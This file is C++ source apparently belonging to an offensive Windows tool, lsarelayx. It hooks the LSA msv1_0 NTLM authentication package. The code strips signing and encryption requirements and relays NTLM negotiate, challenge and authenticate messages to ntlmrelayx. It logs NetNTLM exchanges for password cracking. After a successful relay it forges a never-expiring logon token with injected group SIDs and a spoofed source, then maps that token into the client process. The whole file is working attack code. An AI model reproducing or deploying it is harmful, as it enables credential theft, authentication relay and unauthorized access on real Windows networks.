
#include "lsarelayx.hxx"
#include "debug.hxx"

#include <string>
#include <vector>
#include <system_error>
#include <new>
#include <map>
#include <sddl.h>

/*
 *  This file handles the hooks for the msv1_0 authentication package.
 *
 *  msv1_0 handles all NTLM based authentication, which can either be authenticated
 *  against the local SAM or to a DC via NETLOGON.
 *
 *  The majority of the functionality is inside msv1_0_SpAcceptLsaModeContextHook
 *  which is responsible for redirecting the NTLM tokens over the pipe, which in turn
 *  will forward the NTLM tokens to ntlmrelayx using the RAW server module
 *
 */


typedef struct _NTLM_PACKED_CONTEXT {

    //NTLM packet context from XP source leak
    ULONG   Tag ;
    ULONG   NegotiateFlags ;
    ULONG   ClientTokenHandle ;
    ULONG   SendNonce ;
    ULONG   RecvNonce ;
    UCHAR   SessionKey[ MSV1_0_USER_SESSION_KEY_LENGTH ];
    ULONG   ContextSignature ;
    TimeStamp   PasswordExpiry ;
    ULONG   UserFlags ;
    ULONG   ContextNames ;
    ULONG   ContextNameLength ;
    ULONG   MarshalledTargetInfo;       // offset
    ULONG   MarshalledTargetInfoLength;
    UCHAR   SignSessionKey[ MSV1_0_USER_SESSION_KEY_LENGTH ];
    UCHAR   VerifySessionKey[ MSV1_0_USER_SESSION_KEY_LENGTH ];
    UCHAR   SealSessionKey[ MSV1_0_USER_SESSION_KEY_LENGTH ];
    UCHAR   UnsealSessionKey[ MSV1_0_USER_SESSION_KEY_LENGTH ];

    //Add additional padding for fields that may have been added beyond XP
    UCHAR   Padding[64];

    _NTLM_PACKED_CONTEXT(){
        memset(this, 0, sizeof(_NTLM_PACKED_CONTEXT));
    }

} NTLM_PACKED_CONTEXT, * PNTLM_PACKED_CONTEXT ;

#define NTLM_PACKED_CONTEXT_MAP     0

extern CRITICAL_SECTION g_ContextLock;


RelayContext* AllocateContext(unsigned long long contextKey, int clientPid){

    RelayContext* relayCtx = new RelayContext(g_messageExchangeFactory, true, clientPid);

    EnterCriticalSection(&g_ContextLock);
    g_RelayContexts[contextKey] = relayCtx;
    LeaveCriticalSection(&g_ContextLock);

    return relayCtx;
}

void FreeContext(unsigned long long contextKey){

    EnterCriticalSection(&g_ContextLock);

    if(g_RelayContexts.count(contextKey) > 0){
        auto ctx = g_RelayContexts[contextKey];
        g_RelayContexts.erase(contextKey);
        delete ctx;
    }

    LeaveCriticalSection(&g_ContextLock);
}

RelayContext* GetContext(unsigned long long contextKey){

    RelayContext* relayCtx = nullptr;
    EnterCriticalSection(&g_ContextLock);

    if(g_RelayContexts.count(contextKey) > 0){
        relayCtx = g_RelayContexts[contextKey];
    }

    LeaveCriticalSection(&g_ContextLock);
    return relayCtx;
}

bool IsNTLMMessageType(PSecBufferDesc buffer, uint8_t type){

    uint8_t header[] = {0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, type};

    if(buffer == nullptr || buffer->cBuffers == 0 || buffer->pBuffers[0].cbBuffer < sizeof(header))
        return false;

    if(memcmp(buffer->pBuffers[0].pvBuffer, header, sizeof(header)) == 0){
        return true;
    }else{
        return false;
    }
}

PSID ToSid(const std::wstring& sidStr){

    PSID tempSid = nullptr;

    //Convert the string representation of the users SID to a PSID
    if(!ConvertStringSidToSidW(sidStr.c_str(), &tempSid)){
        throw std::invalid_argument("Failed to convert user SID string");
    }

    DWORD sidLength = GetLengthSid(tempSid);
    PSID result = g_FunctionTable->AllocateLsaHeap(sidLength);
    memcpy(result, tempSid, sidLength);
    LocalFree(tempSid);
    return result;
}


win32_handle CreateTokenFromUserInfo(const LUID& sourceLUID, const UserInfo& userInfo){

    LUID newLogonSession;
    HANDLE tokenHandle;
    NTSTATUS status;
    NTSTATUS subStatus;
    TOKEN_SOURCE tokenSource;
    UNICODE_STRING workstation;
    PLSA_TOKEN_INFORMATION_V2 tokenInfo = nullptr;
    PSECPKG_PRIMARY_CRED primaryCred;

    try{

        tokenInfo = (PLSA_TOKEN_INFORMATION_V2)g_FunctionTable->AllocateLsaHeap(sizeof(LSA_TOKEN_INFORMATION_V2));
        primaryCred = (PSECPKG_PRIMARY_CRED)g_FunctionTable->AllocateLsaHeap(sizeof(SECPKG_PRIMARY_CRED));

        if(tokenInfo == nullptr || primaryCred == nullptr){
            throw std::runtime_error("Failed to allocate LSA credential info memory");
        }

        memset(tokenInfo, 0, sizeof(LSA_TOKEN_INFORMATION_V2));
        memset(primaryCred, 0,sizeof(SECPKG_PRIMARY_CRED));
        memset(&workstation, 0, sizeof(workstation));
        memset(&tokenSource, 0, sizeof(tokenSource));

        //Fill in the user for the token
        tokenInfo->User.User.Sid = ToSid(userInfo.UserSid);
        tokenInfo->User.User.Attributes = 0;

        DBGPRINT(L"Creating Token for user %s with SID %s with %d groups", userInfo.User.c_str(), userInfo.UserSid.c_str(), userInfo.Groups.size());

        //Now populate the token groups
        tokenInfo->Groups = (PTOKEN_GROUPS)g_FunctionTable->AllocateLsaHeap(sizeof(TOKEN_GROUPS) * userInfo.Groups.size());
        memset(tokenInfo->Groups, 0, sizeof(TOKEN_GROUPS) * userInfo.Groups.size());
        tokenInfo->Groups->GroupCount = userInfo.Groups.size();

        for(size_t idx=0; idx < userInfo.Groups.size(); ++idx){
            tokenInfo->Groups->Groups[idx].Sid = ToSid(userInfo.Groups[idx]);
            tokenInfo->Groups->Groups[idx].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT;
            DBGPRINT(L"Added group with SID %s to TOKEN_GROUPS", userInfo.Groups[idx].c_str());
        }

        //Use the first group as the primary group
        tokenInfo->PrimaryGroup.PrimaryGroup = tokenInfo->Groups->Groups[0].Sid;

        //Set the rest to defaults
        tokenInfo->DefaultDacl.DefaultDacl = nullptr;
        tokenInfo->Privileges = nullptr;

        //Never expire the the token
        tokenInfo->ExpirationTime.HighPart = 0x7ffffff;
        tokenInfo->ExpirationTime.LowPart = 0xffffffff;

        if((status = NtAllocateLocallyUniqueId(&newLogonSession)) < 0){
            throw std::system_error(std::error_code(status, std::system_category()), "Failed to allocate new LUID");
        }
        DBGPRINT(L"Created new LUID 0x%llx", *((unsigned long long*)&newLogonSession));

        if((status = g_FunctionTable->CreateLogonSession(&newLogonSession)) < 0){
            throw std::system_error(std::error_code(status, std::system_category()), "Failed to create logon session");
        }
        DBGPRINT(L"Created new logon session", 0);

        //Fill in the primary credential info
        primaryCred->UserSid = tokenInfo->User.User.Sid;
        primaryCred->LogonId = newLogonSession;
        RtlInitUnicodeString(&primaryCred->DomainName, userInfo.Domain.c_str());

        //Fake the token source as NTLM
        tokenSource.SourceIdentifier = sourceLUID;
        memcpy_s(tokenSource.SourceName, sizeof(tokenSource.SourceName), "User32\0", 7);

        //Fingers crossed, lets create our new token
        status = g_FunctionTable->CreateTokenEx(&newLogonSession, &tokenSource, Network, SecurityDelegation, LsaTokenInformationV2, tokenInfo,
                                       nullptr, &workstation, nullptr, primaryCred , SecSessionPrimaryCred, &tokenHandle, &subStatus);

        if(!NT_SUCCESS(status)){
            throw std::system_error(std::error_code(status, std::system_category()), "Failed to create token");
        }

        DBGPRINT(L"Created new token 0x%08x", tokenHandle);
        return win32_handle(tokenHandle);

    }catch(const std::exception& e){

        DBGPRINT(L"Exception thrown when attempting to create new user token: %S", e.what());

        if(tokenInfo->User.User.Sid != nullptr)
            g_FunctionTable->FreeLsaHeap(tokenInfo->User.User.Sid);

        if(tokenInfo->Groups != nullptr && tokenInfo->Groups->GroupCount > 0){
            for(size_t idx=0; idx<tokenInfo->Groups->GroupCount; ++idx){
                if(tokenInfo->Groups->Groups[idx].Sid != nullptr){
                    g_FunctionTable->FreeLsaHeap(tokenInfo->Groups->Groups[idx].Sid);
                }
            }
        }

        throw;
    }
}

NTSTATUS msv1_0_SpDeleteSecurityContextHook(LSA_SEC_HANDLE ContextHandle){

    DBGPRINT(L"0x%llx", ContextHandle);
    FreeContext(ContextHandle);
    return msv1_0_SpDeleteSecurityContext_orig(ContextHandle);
}

void MapContextToClientProcess(const win32_handle& token, LSA_SEC_HANDLE ContextHandle, PLSA_SEC_HANDLE NewContextHandle, ULONG ContextRequirements,
                               PULONG ContextAttributes, PSecBuffer ContextData, PBOOLEAN MappedContext, PTimeStamp ExpirationTime){

    //No expiry
    ExpirationTime->HighPart = 0x7fffffff;
    ExpirationTime->LowPart = 0xffffffff;

    //Map same input context to output
    *ContextAttributes = ContextRequirements;
    *NewContextHandle = (LSA_SEC_HANDLE)ContextHandle;

    //Create the context that will be mapped into the client process
    PNTLM_PACKED_CONTEXT ctxData = (PNTLM_PACKED_CONTEXT)g_FunctionTable->AllocateLsaHeap(sizeof(NTLM_PACKED_CONTEXT));
    ContextData->BufferType = SECBUFFER_DATA;
    ContextData->cbBuffer = sizeof(NTLM_PACKED_CONTEXT);
    ContextData->pvBuffer = ctxData;

    //Duplicate the authenticated token int the client process
    HANDLE tmp;
    g_FunctionTable->DuplicateHandle(token.get(), &tmp);
    ctxData->ClientTokenHandle = (ULONG) ((ULONG_PTR) tmp) ;
    *MappedContext = TRUE;
}

NTSTATUS msv1_0_SpAcceptLsaModeContextHook(LSA_SEC_HANDLE CredentialHandle, LSA_SEC_HANDLE ContextHandle, PSecBufferDesc InputBuffer, ULONG ContextRequirements, ULONG TargetDataRep, PLSA_SEC_HANDLE NewContextHandle,
                                    PSecBufferDesc OutputBuffer, PULONG ContextAttributes, PTimeStamp ExpirationTime, PBOOLEAN MappedContext, PSecBuffer ContextData){

    bool allocateMemory = (ContextRequirements & ISC_REQ_ALLOCATE_MEMORY) == ISC_REQ_ALLOCATE_MEMORY;
    //Turn off signing and encryption for the client request
    ContextRequirements &= ~(ISC_REQ_CONFIDENTIALITY | ISC_REQ_INTEGRITY);
    SECPKG_CLIENT_INFO clientInfo;
    SECPKG_CALL_INFO callInfo;
    g_FunctionTable->GetClientInfo(&clientInfo);
    g_FunctionTable->GetCallInfo(&callInfo);
    NTSTATUS status;
    size_t originalOutputBufferSize = 0;

    if(OutputBuffer != nullptr && OutputBuffer->cBuffers > 0){
        originalOutputBufferSize = OutputBuffer->pBuffers[0].cbBuffer;
    }

    if(IsNTLMMessageType(InputBuffer, 1)){

        //Call the original just so a context is allocated and we can check some of the NTLM challenge attributes
        status = msv1_0_SpAcceptLsaModeContext_orig(CredentialHandle, ContextHandle, InputBuffer, ContextRequirements, TargetDataRep, NewContextHandle, OutputBuffer, ContextAttributes, ExpirationTime, MappedContext, ContextData);

        try{

            //Shouldn't really happen, but defensive checks just in case
            if(NewContextHandle == nullptr || *NewContextHandle == 0){
                return status;
            }

            //We default to passive mode which just monitors all
            //NTLM negotations for NetNTLM cracking purposes
            RelayContext* relayCtx = AllocateContext(*NewContextHandle, clientInfo.ProcessID);

            if(OutputBuffer == nullptr || !NT_SUCCESS(status)){
                DBGPRINT(L"No output buffer, reverting to default operation", 0);
            }else{

                //check to see if the flags contains Negotiate Local Call,
                //if so we are not really interested in those types of authentication
                //if(OutputBuffer->cBuffers > 0 && OutputBuffer->pBuffers[0].cbBuffer > 24){
                //    uint32_t flags = *(uint32_t*)(&OutputBuffer->pBuffers[0].pvBuffer + 20);
                //    if((flags & 0x00004000) > 0){
                //        DBGPRINT(L"NTLM local auth received, ignoring", 0);
                //        return status;
                //    }
                //}

                if(!allocateMemory){

                   auto relayResponse = relayCtx->ForwardNegotiateMessage((uint64_t)callInfo.CallCount, MessageBuffer((uint8_t*)InputBuffer->pBuffers[0].pvBuffer, (uint8_t*)(DWORD_PTR(InputBuffer->pBuffers[0].pvBuffer) + InputBuffer->pBuffers[0].cbBuffer)));

                   if(relayCtx->IsPassiveMode()){
                       DBGPRINT(L"Passive mode response received for NTLM Type 1", 0);
                   }else{

                       //We received a relayed NTLM challenge, so lets switch to relay mode for this context and replace
                       //the challenge message with the one received from the relay host
                       OutputBuffer->pBuffers[0].BufferType = SECBUFFER_TOKEN;

                       if(originalOutputBufferSize < relayResponse.NTLMMessage.size()){
                           DBGPRINT(L"OutputBuffer too small, buffer count %d, got %d need %d", OutputBuffer->cBuffers, OutputBuffer->pBuffers[0].cbBuffer, relayResponse.NTLMMessage.size());
                           return SEC_E_BUFFER_TOO_SMALL;
                       }else{

                           memcpy(OutputBuffer->pBuffers[0].pvBuffer, &relayResponse.NTLMMessage[0], relayResponse.NTLMMessage.size());
                           OutputBuffer->pBuffers[0].cbBuffer = relayResponse.NTLMMessage.size();
                           *ContextAttributes = ContextRequirements;
                           *MappedContext = FALSE;

                           return SEC_I_CONTINUE_NEEDED;
                       }
                   }

                }else{
                    DBGPRINT(L"TODO: Alloc Needed, fall back to passive!", 0);
                }
            }

            if(status == SEC_I_CONTINUE_NEEDED && relayCtx->IsPassiveMode() && OutputBuffer != nullptr && OutputBuffer->cBuffers > 0){
                //Since we are not relaying, just send the NTLM challenge message generated from this host instead
                relayCtx->ForwardChallengeMessage((uint64_t)callInfo.CallCount,MessageBuffer((uint8_t*)OutputBuffer->pBuffers[0].pvBuffer, (uint8_t*)(DWORD_PTR(OutputBuffer->pBuffers[0].pvBuffer) + OutputBuffer->pBuffers[0].cbBuffer)));
            }

            return status;

        }catch(const std::exception& e){
             DBGPRINT(L"Got exception when sending NTLM message type 1: %S", e.what());
        }

        return status;

    }else if(IsNTLMMessageType(InputBuffer,3)){

        try{

            auto relayCtx = GetContext(ContextHandle);

            if(relayCtx != nullptr){

                auto relayFinishedReponse = relayCtx->ForwardAuthenticateMessage((uint64_t)callInfo.CallCount,MessageBuffer((uint8_t*)InputBuffer->pBuffers[0].pvBuffer, (uint8_t*)(DWORD_PTR(InputBuffer->pBuffers[0].pvBuffer) + InputBuffer->pBuffers[0].cbBuffer)));

                if(!relayCtx->IsPassiveMode()){
                    if(relayCtx->IsAuthenticated()){

                        //Everything relayed and we authenticated successfully,
                        //so lets create a token we can use for this authentication context
                        win32_handle authToken(CreateTokenFromUserInfo(clientInfo.LogonId, relayCtx->GetUserInfo()));
                        MapContextToClientProcess(authToken, ContextHandle, NewContextHandle, ContextRequirements,
                                                  ContextAttributes, ContextData, MappedContext, ExpirationTime);

                        //Reset the output buffer size to simulate no more NTLM tokens
                        if(OutputBuffer != nullptr && OutputBuffer->cBuffers > 0)
                            OutputBuffer->pBuffers[0].cbBuffer = 0;

                        return SEC_E_OK;

                    }else{

                        //Relay failed so simulate incorrect creds
                        return SEC_E_INVALID_TOKEN;
                    }
                }
                //we are in passive mode, so fall through to default behaciour
            }

        }catch(const std::exception& e){
             DBGPRINT(L"Got exception when sending NTLM message type 3: %S", e.what());
        }

    }else{
        DBGPRINT(L"Got unknown NTLM message type", 0);
    }


    return msv1_0_SpAcceptLsaModeContext_orig(CredentialHandle, ContextHandle, InputBuffer, ContextRequirements, TargetDataRep, NewContextHandle, OutputBuffer, ContextAttributes, ExpirationTime, MappedContext, ContextData);
}
